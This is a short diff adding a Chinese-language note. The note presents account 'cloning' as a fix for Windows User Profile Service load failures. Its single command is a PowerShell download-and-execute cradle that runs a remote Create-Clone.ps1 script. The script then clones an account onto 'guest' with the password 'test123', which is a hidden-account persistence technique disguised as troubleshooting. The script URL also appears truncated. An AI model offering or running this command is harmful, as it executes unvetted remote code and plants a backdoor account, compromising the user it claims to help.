@@ -1,0 +1,3 @@
+ 如果系统出现UPS （user profile service） 用户配置文件加载不出来就用克隆的方法
+ powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Create-Clone.ps1'); Create-Clone -u guest -p test123 
+    
